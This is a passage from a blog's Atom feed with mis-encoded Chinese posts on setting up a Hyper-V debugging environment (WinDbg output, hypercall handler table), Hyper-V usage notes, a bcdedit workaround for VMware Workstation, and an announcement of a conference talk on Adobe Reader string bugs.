class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; lmvm hv</span><br><span class="line">Browse full module list</span><br><span class="line">start             end                 module name</span><br><span class="line">fffffb6a`57000000 fffffb6a`58800000   hv         (no symbols)</span><br><span class="line">    Loaded symbol image file: hvax64.exe</span><br><span class="line">    Image path: hvax64.exe</span><br><span class="line">    Image name: hvax64.exe</span><br><span class="line">    Browse all global symbols  functions  data</span><br><span class="line">    Image was built with /Brepro flag.</span><br><span class="line">    Timestamp:        DBBF3B47</span><br><span class="line">    CheckSum:         00110BD8</span><br><span class="line">    ImageSize:        01800000</span><br><span class="line">    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4</span><br><span class="line">    Information from resource tables:</span><br><span class="line"></span><br><span class="line">0: kd&gt; ?hv</span><br><span class="line">Evaluate expression: -5040831987712 = fffffb6a`57000000</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œç‰©ç†æœºä½¿ç”¨çš„æ˜¯ AMD çš„ CPUï¼Œæ‰€ä»¥ <code>hv</code> æ¨¡å—å®é™…ä¸Šæ˜¯ <code>hvax64.exe</code> ï¼›å¦‚æœæ˜¯ Intel çš„ CPUï¼Œé‚£ä¹ˆä¼šæ˜¯ <code>hvix64.exe</code> ã€‚</p><p>åœ¨è°ƒè¯• Windows å†…æ ¸çš„ WinDbg ä¸­ï¼Œå¯ä»¥æŸ¥çœ‹ <code>hypercall</code> å¯¹åº”çš„æŒ‡ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; u poi(nt!HvcallCodeVa)</span><br><span class="line">fffff804`4cbe0000 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0003 c3              ret</span><br><span class="line">fffff804`4cbe0004 8bc8            mov     ecx,eax</span><br><span class="line">fffff804`4cbe0006 b811000000      mov     eax,11h</span><br><span class="line">fffff804`4cbe000b 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe000e c3              ret</span><br><span class="line">fffff804`4cbe000f 488bc1          mov     rax,rcx</span><br><span class="line">fffff804`4cbe0012 48c7c111000000  mov     rcx,11h</span><br><span class="line">fffff804`4cbe0019 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe001c c3              ret</span><br><span class="line">fffff804`4cbe001d 8bc8            mov     ecx,eax</span><br><span class="line">fffff804`4cbe001f b812000000      mov     eax,12h</span><br><span class="line">fffff804`4cbe0024 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0027 c3              ret</span><br><span class="line">fffff804`4cbe0028 488bc1          mov     rax,rcx</span><br><span class="line">fffff804`4cbe002b 48c7c112000000  mov     rcx,12h</span><br><span class="line">fffff804`4cbe0032 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0035 c3              ret</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œç‰©ç†æœºä½¿ç”¨çš„æ˜¯ AMD çš„ CPUï¼Œæ‰€ä»¥ <code>hypercall</code> å¯¹åº”çš„æŒ‡ä»¤ä¸º <code>vmmcall</code> ï¼›å¦‚æœæ˜¯ Intel çš„ CPUï¼Œé‚£ä¹ˆ <code>hypercall</code> å¯¹åº”çš„æŒ‡ä»¤ä¸º <code>vmcall</code> ã€‚</p><p>å¯¹ <code>vmmcall</code> æ‰€åœ¨çš„ä½ç½®ä¸‹æ–­ç‚¹ï¼Œéœ€è¦ä½¿ç”¨ç¡¬ä»¶æ‰§è¡Œæ–­ç‚¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; ba e1 poi(nt!HvcallCodeVa)</span><br><span class="line">3: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">fffff804`4cbe0000 0f01d9          vmmcall</span><br><span class="line"></span><br><span class="line">1: kd&gt; k</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 ffffbe0b`d64532c8 fffff804`4d9cc124 0xfffff804`4cbe0000</span><br><span class="line">01 ffffbe0b`d64532d0 fffff804`4da8e91c nt!HvcallpExtendedFastHypercall+0x54</span><br><span class="line">02 ffffbe0b`d64532e0 fffff804`4da8eb10 nt!HvlpFastFlushListTb+0xac</span><br><span class="line">03 ffffbe0b`d64533a0 fffff804`4da8e5f3 nt!HvlpFlushRangeListTb+0x88</span><br><span class="line">04 ffffbe0b`d6453400 fffff804`4da52642 nt!HvlFlushRangeListTb+0x63</span><br><span class="line">05 ffffbe0b`d6453450 fffff804`4d8f3e71 nt!MiFlushTbList+0x167fe2</span><br><span class="line">06 ffffbe0b`d64535a0 fffff804`4d8f5305 nt!MiCopyOnWrite+0x761</span><br><span class="line">07 ffffbe0b`d6453840 fffff804`4d8c986f nt!MiValidFault+0x295</span><br><span class="line">08 ffffbe0b`d64538b0 fffff804`4d8c8fae nt!MiUserFault+0x3cf</span><br><span class="line">09 ffffbe0b`d6453960 fffff804`4d9d041e nt!MmAccessFault+0x14e</span><br><span class="line">0a ffffbe0b`d6453b00 00007ff8`107805d3 nt!KiPageFault+0x35e</span><br><span class="line">0b 0000002e`3b4fb030 00000003`22e0813e 0x00007ff8`107805d3</span><br><span class="line">0c 0000002e`3b4fb038 000001b8`adbe82f0 0x00000003`22e0813e</span><br><span class="line">0d 0000002e`3b4fb040 00000000`00000000 0x000001b8`adbe82f0</span><br></pre></td></tr></table></figure><p>å’Œç³»ç»Ÿè°ƒç”¨ä¸€æ ·ï¼Œä¸åŒçš„ <code>hypercall</code> å¯¹åº”ä¸åŒçš„ç¼–å·ï¼Œç¼–å·å¯ä»¥ç”¨äºå®šä½å¯¹åº”çš„ Handler å‡½æ•°ã€‚åœ¨åœ°å€ <code>hv+0xC00000</code> å¤„ï¼Œæ¯ä¸€ä¸ª <code>hypercall</code> æœ‰ä¸€ä¸ª <code>0x18</code> å­—èŠ‚çš„ç»“æ„ä½“ï¼Œå…¶ä¸­ç»“æ„ä½“æœ€å‰é¢çš„ <code>8</code> å­—èŠ‚ä¾¿æ˜¯å¯¹åº”çš„ Handler å‡½æ•°çš„èµ·å§‹åœ°å€ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">4: kd&gt; dq hv+0xC00000</span><br><span class="line">fffffb6a`57c00000  fffffb6a`572321e0 00000000`00000000</span><br><span class="line">fffffb6a`57c00010  00000041`00000000 fffffb6a`5729ae90</span><br><span class="line">fffffb6a`57c00020  00000008`00000001 00000044`00000000</span><br><span class="line">fffffb6a`57c00030  fffffb6a`5722dcc0 00000018`00000002</span><br><span class="line">fffffb6a`57c00040  00000044`00000000 fffffb6a`57215e40</span><br><span class="line">fffffb6a`57c00050  00080018`00010003 00000044`00000000</span><br><span class="line">fffffb6a`57c00060  fffffb6a`5729b230 00000008`00000004</span><br><span class="line">fffffb6a`57c00070  0000003f`00000020 fffffb6a`57244200</span><br><span class="line"></span><br><span class="line">4: kd&gt; u fffffb6a`572321e0</span><br><span class="line">hv+0x2321e0:</span><br><span class="line">fffffb6a`572321e0 b802000000      mov     eax,2</span><br><span class="line">fffffb6a`572321e5 c3              ret</span><br><span class="line">fffffb6a`572321e6 cc              int     3</span><br></pre></td></tr></table></figure><h2 id="0x05-è°ƒè¯•ç¬¦å·"><a href="#0x05-è°ƒè¯•ç¬¦å·" class="headerlink" title="0x05. è°ƒè¯•ç¬¦å·"></a>0x05. è°ƒè¯•ç¬¦å·</h2><p>å¾®è½¯å·²ç»é€æ­¥å¼€æ”¾äº† Hyper-V ç›¸å…³ç»„ä»¶çš„è°ƒè¯•ç¬¦å·ï¼Œä½†æ˜¯ <code>hv</code> æ¨¡å—ï¼ˆå³ <code>hvax64.exe / hvix64.exe</code> ï¼‰çš„è°ƒè¯•ç¬¦å·æš‚æ—¶ä¸å¯¹åƒç“œç¾¤ä¼—å¼€æ”¾ã€‚</p><p>å¾®è½¯è¿˜ä¸º WinDbg å¼€å‘äº†ä¸€ä¸ªè°ƒè¯• Hyper-V çš„æ’ä»¶ <code>hvexts.dll</code> ï¼Œä½†ç›®å‰ä¹Ÿæ²¡æœ‰å¯¹å¤–å¼€æ”¾ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»ä½¿ç”¨ AMD CPU çš„ç”µè„‘å¦‚ä½•åˆ©ç”¨ VMware Workstation æ­å»º Hyper-V çš„è°ƒè¯•ç¯å¢ƒã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="http://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="http://programlife.net/tags/Hyper-V/"/>
    
      <category term="VMware Workstation" scheme="http://programlife.net/tags/VMware-Workstation/"/>
    
  </entry>
  
  <entry>
    <title>Hyper-V on Windows 10 Notes</title>
    <link href="http://programlife.net/2020/05/13/hyper-v-on-windows-10-notes/"/>
    <id>http://programlife.net/2020/05/13/hyper-v-on-windows-10-notes/</id>
    <published>2020-05-13T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«èŠ±äº†ç‚¹æ—¶é—´çœ‹äº†å¾®è½¯å¯¹ Hyper-V çš„ä»‹ç»æ–‡æ¡£ã€Š<a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/" target="_blank" rel="noopener">Hyper-V on Windows 10</a>ã€‹ï¼Œé¡ºä¾¿è®°ç‚¹ç¬”è®°ã€‚</p><a id="more"></a><ul><li><p><strong>About Hyper-V on Windows</strong></p><ul><li><em>Introduction to Hyper-V</em><ul><li>åœ¨ Windows å®¿ä¸»æœºä¸­å¯ç”¨ Hyper-V ä¹‹åï¼Œå®¿ä¸»æœºä¹Ÿä¼šè¿è¡Œåœ¨ Hyper-V ä¹‹ä¸Šï¼ˆå°±åƒ Hyper-V ä¸­åˆ›å»ºçš„è™šæ‹Ÿæœºä¸€æ ·ï¼‰ï¼Œå› æ­¤å®¿ä¸»æœºä¸­æŸäº›å¯¹å®æ—¶æ€§è¦æ±‚è¾ƒé«˜çš„åº”ç”¨ç¨‹åºçš„è¿è¡Œå¯èƒ½ä¼šå—åˆ°ä¸€å®šçš„å½±å“ï¼›ä½†ä¸è™šæ‹Ÿæœºä¸åŒçš„æ˜¯ï¼Œå®¿ä¸»æœºå¯ä»¥ç›´æ¥è®¿é—®æ‰€æœ‰ç¡¬ä»¶èµ„æºã€‚</li></ul></li></ul></li></ul><p><img src="/uploads/202005/hyperv-architecture.png" alt="Hyper-V æ¶æ„å›¾"></p><ul><li><p><strong>Get started with Hyper-V</strong></p><ul><li><p><em>Install Hyper-V</em></p><ul><li>å®‰è£… Hyper-V æœ‰å¤šç§æ–¹å¼ï¼Œåœ¨ <strong>å¯ç”¨æˆ–å…³é—­ Windows åŠŸèƒ½</strong> ä¸­å®‰è£…æ˜¯ä¸€ç§éå¸¸ç®€å•çš„æ–¹å¼ã€‚</li></ul></li><li><p><em>Create a Virtual Machine</em></p><ul><li><p>åœ¨åˆ›å»ºè™šæ‹Ÿæœºæ—¶ä¼šæ¶‰åŠåˆ° Generation çš„æ¦‚å¿µï¼Œå¾®è½¯å»ºè®®åˆ›å»ºäºŒä»£è™šæ‹Ÿæœºï¼›ä¸€ä»£è™šæ‹Ÿæœºæ”¯æŒç»å¤§å¤šæ•°çš„æ“ä½œç³»ç»Ÿï¼ŒäºŒä»£è™šæ‹Ÿæœºæ”¯æŒ Secure Bootï¼ˆä»…æ”¯æŒå®‰è£… 64 ä½æ“ä½œç³»ç»Ÿï¼‰ï¼›è™šæ‹Ÿæœºä¸€æ—¦åˆ›å»ºï¼ŒGeneration ä¾¿ä¸å¯æ›´æ”¹ã€‚</p></li><li><p>Secure Boot ä¼šæ£€æŸ¥ Bootloader çš„ç­¾åä¸»ä½“åœ¨ UEFI æ•°æ®åº“ä¸­æ˜¯å¦å­˜åœ¨ï¼Œéæ³•çš„ Bootloader ä¸ä¼šè¢«è¿è¡Œã€‚</p></li><li><p>å¦‚æœè¦è°ƒè¯•è™šæ‹Ÿæœºæ“ä½œç³»ç»Ÿçš„å†…æ ¸ï¼Œé‚£ä¹ˆéœ€è¦å…ˆç¦ç”¨ Secure Bootï¼Œç„¶åé€šè¿‡ PowerShell å‘½ä»¤ä¸ºè™šæ‹Ÿæœºæ·»åŠ ä¸€ä¸ªä¸²å£ï¼š</p><ul><li><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-VMComPort -VMName TestVM <span class="number">1</span> \\.\pipe\TestPipe</span><br></pre></td></tr></table></figure></li></ul></li><li><p>è™šæ‹Ÿæœºé»˜è®¤ä¼šå¼€å¯ <strong>ä½¿ç”¨è‡ªåŠ¨æ£€æŸ¥ç‚¹</strong>ï¼Œå³è‡ªåŠ¨åˆ›å»ºå¿«ç…§åŠŸèƒ½ï¼Œå»ºè®®å…³é—­è¯¥é€‰é¡¹ã€‚</p></li></ul></li><li><p><em>Hyper-V and PowerShell</em></p><ul><li>ä½¿ç”¨ PowerShell å¯ä»¥å¾ˆæ–¹ä¾¿çš„å’Œè™šæ‹Ÿæœºè¿›è¡Œå„ç§äº¤äº’ï¼Œåœ¨ Fuzz çš„æ—¶å€™åº”è¯¥ä¼šæœ‰ç”¨ã€‚</li></ul></li><li><p><em>Share devices with VMs</em></p><ul><li>è™šæ‹Ÿæœºé»˜è®¤ä½¿ç”¨ <strong>å¢å¼ºä¼šè¯</strong> æ¨¡å¼ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡ RDP æ¥è®¿é—®è™šæ‹Ÿæœºï¼Œä½“éªŒå’Œä½¿ç”¨è¿œç¨‹æ¡Œé¢æ˜¯ä¸€æ ·çš„ï¼›åœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œè™šæ‹Ÿæœºå’Œå®¿ä¸»æœºä¹‹é—´é»˜è®¤å…±äº«å‰ªè´´æ¿å¹¶æ”¯æŒæ–‡ä»¶æ‹–æ”¾ï¼Œé€šè¿‡è®¾ç½®è¿˜å¯ä»¥å…±äº«éŸ³é¢‘è®¾å¤‡ã€é©±åŠ¨å™¨ã€æ‰“å°æœºç­‰ï¼›å®é™…æµ‹è¯•è¡¨æ˜è¯¥æ¨¡å¼ä¸‹çš„ç”»é¢æ¸…æ™°åº¦æ›´é«˜ï¼ŒUI ä¸ä¼šæœ‰æ¨¡ç³Šçš„æ„Ÿè§‰ã€‚</li></ul></li><li><p><em>Connect with PowerShell Direct</em></p><ul><li>æ”¯æŒåœ¨å®¿ä¸»æœºä¸­é’ˆå¯¹è™šæ‹Ÿæœºæ‰§è¡Œ PowerShell å‘½ä»¤ã€‚</li></ul></li></ul></li><li><p><strong>Nested Virtualization</strong></p><ul><li><p>Hyper-V æ”¯æŒåµŒå¥—è™šæ‹ŸåŒ–ï¼ˆç›®å‰ä»…æ”¯æŒ Intel CPUï¼‰ï¼Œå¯ä½¿ç”¨ PowerShell å‘½ä»¤ä¸ºè™šæ‹Ÿæœºå¯ç”¨è¯¥ç‰¹æ€§ï¼š</p><ul><li><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-VMProcessor -VMName &lt;VMName&gt; -ExposeVirtualizationExtensions <span class="literal">$true</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>Hyper-V å¯èƒ½åœ¨æœªæ¥çš„ç‰ˆæœ¬ä¸­å¢åŠ å¯¹ AMD CPU åµŒå¥—è™šæ‹ŸåŒ–çš„æ”¯æŒï¼ˆå‚è€ƒ <a href="https://github.com/MicrosoftDocs/Virtualization-Documentation/issues/1276" target="_blank" rel="noopener">AMD nested virtualization?</a>ï¼‰ã€‚</p></li></ul></li></ul><p>æœªå¯ç”¨åµŒå¥—è™šæ‹ŸåŒ–æ—¶çš„ Hyper-V æ¶æ„å›¾å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202005/hyperv-no-nesting.png" alt="æœªå¯ç”¨åµŒå¥—è™šæ‹ŸåŒ–çš„ Hyper-V æ¶æ„å›¾"></p><p>å¯ç”¨äº†åµŒå¥—è™šæ‹ŸåŒ–ä¹‹åçš„ Hyper-V æ¶æ„å›¾å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202005/hyperv-nesting.png" alt="å¯ç”¨äº†åµŒå¥—è™šæ‹ŸåŒ–çš„ Hyper-V æ¶æ„å›¾"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘¨æœ«èŠ±äº†ç‚¹æ—¶é—´çœ‹äº†å¾®è½¯å¯¹ Hyper-V çš„ä»‹ç»æ–‡æ¡£ã€Š&lt;a href=&quot;https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hyper-V on Windows 10&lt;/a&gt;ã€‹ï¼Œé¡ºä¾¿è®°ç‚¹ç¬”è®°ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="http://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="http://programlife.net/tags/Hyper-V/"/>
    
  </entry>
  
  <entry>
    <title>VMware Workstation Incompatible with Device/Credential Guard</title>
    <link href="http://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/"/>
    <id>http://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/</id>
    <published>2020-05-10T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨ Windows ä¸­å¯ç”¨ Hyper-V ä¹‹åï¼ŒVMware Workstation å°±ä¸èƒ½ç”¨äº†ï¼Œä¼šæç¤ºâ€œVMware Workstation ä¸ Device/Credential Guard ä¸å…¼å®¹ã€‚åœ¨ç¦ç”¨ Device/Credential Guard åï¼Œå¯ä»¥è¿è¡Œ VMware Workstationâ€ï¼Œç„¶è€Œç¦ç”¨ Device/Credential Guard å¹¶ä¸èƒ½è§£å†³é—®é¢˜ã€‚</p><a id="more"></a><p><img src="/uploads/202005/vmware-workstation-incompatible-with-device-credential-guard.png" alt="VMware Workstation and Device/Credential Guard are not compatible"></p><p>å¯ç”¨ Hyper-V ä¹‹åï¼ŒåŸæ¥çš„å®¿ä¸»æœºæ“ä½œç³»ç»Ÿå®é™…ä¸Šä¹Ÿå˜æˆäº†ä¸€å°è™šæ‹Ÿæœºï¼Œå³å®¿ä¸»æœºæ“ä½œç³»ç»Ÿæ˜¯è¿è¡Œåœ¨ Hypervisor ä¹‹ä¸Šçš„ï¼Œæ­¤æ—¶å†è¿è¡Œ VMware Workstation <strong><em>å¯èƒ½ä¼šäº§ç”ŸåµŒå¥—è™šæ‹ŸåŒ–</em></strong>ï¼ˆæ­¤ä¸ºçŒœæµ‹ï¼‰ï¼Œè€Œ Hyper-V çš„è™šæ‹Ÿæœºé»˜è®¤æ˜¯æ²¡æœ‰å¼€å¯åµŒå¥—è™šæ‹ŸåŒ–æ”¯æŒçš„ã€‚</p><p>ä¸€ä¸ªå¯è¡Œçš„è§£å†³æ–¹æ³•æ˜¯é€šè¿‡ <code>bcdedit</code> è®¾ç½®ä¸¤å¥—å¯åŠ¨æ–¹æ¡ˆï¼Œä¸€å¥—å¯ç”¨ Hyper-Vï¼Œå¦ä¸€å¥—åˆ™ç¦ç”¨ Hyper-Vï¼ˆè®¾ç½® <code>HypervisorLaunchType</code> ä¸º <code>OFF</code>ï¼‰ä»¥ä¾¿è¿è¡Œ VMware Workstationã€‚</p><p><img src="/uploads/202005/bcdedit-hypervisor-launchtype.png" alt="é€šè¿‡ bcdedit å‚æ•° HypervisorLaunchType ç¦ç”¨ Hyper-V"></p><p>ç›¸å…³å‘½ä»¤æ–‡æœ¬ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> &#123;current&#125; description <span class="string">"Windows 10 Hyper-V"</span></span><br><span class="line">bcdedit /copy &#123;current&#125; /d <span class="string">"Winows 10"</span></span><br><span class="line"><span class="comment">// å·²å°†è¯¥é¡¹æˆåŠŸå¤åˆ¶åˆ° &#123;new_guid&#125;</span></span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;new_guid&#125; HypervisorLaunchType OFF</span><br><span class="line">bcdedit /displayorder &#123;current&#125; &#123;new_guid&#125;</span><br><span class="line">bcdedit /timeout <span class="number">10</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé»˜è®¤è¿›å…¥å¯ç”¨äº† Hyper-V çš„å¯åŠ¨é¡¹ï¼Œç­‰å¾…æ—¶é—´è®¾ç½®ä¸º 10 ç§’é’Ÿã€‚</p><p><strong>2020/05/30 æ›´æ–°</strong></p><p>VMware Workstation 15.5 å·²ç»æ”¯æŒè¿è¡Œåœ¨ Hyper-V æ¨¡å¼ä¸‹äº†ï¼Œè¦æ±‚ Windows è‡³å°‘æ˜¯ Windows 10 20H1 build 19041.264 åŠæ›´æ–°ç‰ˆæœ¬ï¼Œå‚è€ƒ <a href="https://blogs.vmware.com/workstation/2020/05/vmware-workstation-now-supports-hyper-v-mode.html" target="_blank" rel="noopener">VMware Workstation 15.5 Now Supports Host Hyper-V Mode</a> ï¼š</p><blockquote><p><strong>How does VMware Workstation work before version 15.5.5?</strong> </p><p>VMware Workstation traditionally has used a Virtual Machine Monitor (VMM) which operates in privileged mode requiring direct access to the CPU as well as access to the CPUâ€™s built in virtualization support (Intelâ€™s VT-x and AMDâ€™s AMD-V).  When a Windows host enables Virtualization Based Security (â€œ<a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs" target="_blank" rel="noopener">VBS</a>â€œ) features, Windows adds a hypervisor layer based on Hyper-V between the hardware and Windows.  Any attempt to run VMwareâ€™s traditional VMM fails because being inside Hyper-V the VMM no longer has access to the hardwareâ€™s virtualization support.</p><p><strong>Introducing User Level Monitor</strong></p><p>To fix this Hyper-V/Host VBS compatibility issue, VMwareâ€™s platform team re-architected VMwareâ€™s Hypervisor to use Microsoftâ€™s WHP APIs. This means <strong><em>changing our VMM to run at user level\</em></strong> instead of in privileged mode, as well modifying it to use the WHP APIs to manage the execution of a guest instead of using the underlying hardware directly.</p><p><strong>What does this mean to you?</strong></p><p>VMware Workstation/Player can now run when Hyper-V is enabled. You no longer have to choose between running VMware Workstation and Windows features like WSL, Device Guard and Credential Guard. When Hyper-V is enabled, ULM mode will automatically be used so you can run VMware Workstation normally. If you donâ€™t use Hyper-V at all, VMware Workstation is smart enough to detect this and the VMM will be used.</p><p><strong>System Requirements</strong></p><p>To run Workstation/Player using the Windows Hypervisor APIs, the minimum required Windows 10 version is Windows 10 20H1 build 19041.264. VMware Workstation/Player minimum version is 15.5.5.</p></blockquote><p>ä¸çŸ¥é“è¿™ä¸ªæ–°å¼•å…¥çš„ User Level Monitor å¯¹è™šæ‹Ÿæœºçš„æ€§èƒ½æ˜¯å¦æœ‰å½±å“ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨ Windows ä¸­å¯ç”¨ Hyper-V ä¹‹åï¼ŒVMware Workstation å°±ä¸èƒ½ç”¨äº†ï¼Œä¼šæç¤ºâ€œVMware Workstation ä¸ Device/Credential Guard ä¸å…¼å®¹ã€‚åœ¨ç¦ç”¨ Device/Credential Guard åï¼Œå¯ä»¥è¿è¡Œ VMware Workstationâ€ï¼Œç„¶è€Œç¦ç”¨ Device/Credential Guard å¹¶ä¸èƒ½è§£å†³é—®é¢˜ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="http://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="http://programlife.net/tags/Hyper-V/"/>
    
      <category term="VMware Workstation" scheme="http://programlife.net/tags/VMware-Workstation/"/>
    
  </entry>
  
  <entry>
    <title>Pwning Adobe Reader Multiple Times with Malformed Strings</title>
    <link href="http://programlife.net/2020/04/29/pwning-adobe-reader-multiple-times-with-malformed-strings/"/>
    <id>http://programlife.net/2020/04/29/pwning-adobe-reader-multiple-times-with-malformed-strings/</id>
    <published>2020-04-29T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡æˆ‘åœ¨ HITB Lockdown Livestream ä¸Šå‘è¡¨äº†é¢˜ä¸ºã€Š<strong>Pwning Adobe Reader Multiple Times with Malformed Strings</strong>ã€‹çš„æ¼”è®²ï¼Œè¯¥æ¼”è®²æœ¬æ¥æ˜¯ä¸º HITB 2020 Amsterdam å‡†å¤‡çš„ï¼Œä½†ç”±äºå—ç–«æƒ…å½±å“ï¼Œä¸»åŠæ–¹è¢«è¿«å–æ¶ˆäº†åŸæ¥çš„ä¼šè®®å®‰æ’ï¼Œè½¬è€Œåœ¨ YouTube ä¸Šä¸¾åŠäº†ä¸€æ¬¡å…è´¹çš„åœ¨çº¿ä¼šè®®ã€‚</p><a id="more"></a><p>è¿™æ¬¡çš„è®®é¢˜æ˜¯æˆ‘åœ¨ ZeroNights 2019 ä¸Šçš„æ¼”è®²ã€Š<strong>Two Bytes to Rule Adobe Reader Twice: The Black Magic Behind the Byte Order Mark</strong>ã€‹çš„è¿›ä¸€æ­¥ç ”ç©¶ï¼Œå› æ­¤ä¼šæœ‰æ¥è¿‘ 40% çš„å†…å®¹æ˜¯é‡å¤çš„ã€‚è¿™æ¬¡æ¼”è®²ç²¾ç®€äº†ä¸Šä¸€æ¬¡æ¼”è®²çš„å†…å®¹ï¼Œå¢åŠ äº†å¯¹ Adobe JavaScript å¼•æ“ç›¸å…³æ•°æ®ç»“æ„çš„åˆ†æï¼ŒåŒæ—¶å¢åŠ äº† 2 ä¸ªæ–°çš„å¯åˆ©ç”¨æ¼æ´ï¼›æœ€é‡è¦çš„æ˜¯ï¼Œè¿™æ¬¡æˆ‘èŠ±äº†ä¸å°‘æ—¶é—´å†™äº†ä¸€ç¯‡éå¸¸è¯¦ç»†çš„ Paperï¼Œæ–¹ä¾¿æ„Ÿå…´è¶£çš„åŒå­¦è‡ªè¡Œå¼€å±•æ¼æ´åˆ†æå·¥ä½œã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™æ¬¡æ–°å¢åŠ çš„ 2 ä¸ªæ¼æ´å…¶å®å·²ç»å­˜äº†å¾ˆä¹…äº†ï¼Œè€Œè·ç¦»ä¸Šä¸€æ¬¡æ¼”è®²å·²ç»è¿‡å»äº†å°†è¿‘åŠå¹´çš„æ—¶é—´ï¼Œæ‰€ä»¥å¦‚æœæœ‰äººè®¤çœŸç ”ç©¶äº†æˆ‘ä¸Šä¸€æ¬¡æ¼”è®²çš„å†…å®¹çš„è¯ï¼Œå‘ç°è¿™ 2 ä¸ªæ¼æ´ä¹Ÿä¸æ˜¯ä»€ä¹ˆéš¾äº‹ :-)</p><p>è®®é¢˜æ–‡æ¡£ï¼š</p><ul><li><a href="/uploads/202004/pwning_adobe_reader_multiple_times_with_malformed_strings_slides.pdf">Pwning Adobe Reader Multiple Times with Malformed Strings - Slides</a></li><li><a href="/uploads/202004/pwning_adobe_reader_multiple_times_with_malformed_strings_whitepaper.pdf">Pwning Adobe Reader Multiple Times with Malformed Strings - Paper</a></li></ul><p><img src="/uploads/202004/hitb-livestream.png" alt="HITB Lockdown Livestream æ¼”è®²"></p>]]></content>
    
    <summary type="html">
    
